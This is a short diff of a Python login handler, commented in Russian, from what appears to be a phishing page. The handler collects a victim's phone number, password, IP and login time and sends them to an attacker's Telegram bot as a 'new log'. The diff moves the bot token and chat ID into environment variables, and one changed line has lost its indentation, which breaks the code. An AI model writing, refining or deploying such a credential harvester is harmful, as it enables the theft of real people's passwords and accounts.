@@ -114,8 +114,8 @@ def login():
     time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
     # Отправка в Telegram
-    bot_token = "ТВОЙ_ТОКЕН_БОТА"
-    chat_id = "ТВОЙ_ID"
+    bot_token = os.environ.get("BOT_TOKEN", "")
+chat_id = os.environ.get("CHAT_ID", "")
     msg = f"🔐 НОВЫЙ ЛОГ\\n📱 Телефон: +7 {phone}\\n🔑 Пароль: {password}\\n🌐 IP: {ip}\\n🕐 Время: {time}"
     try:
         requests.get(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={msg}")
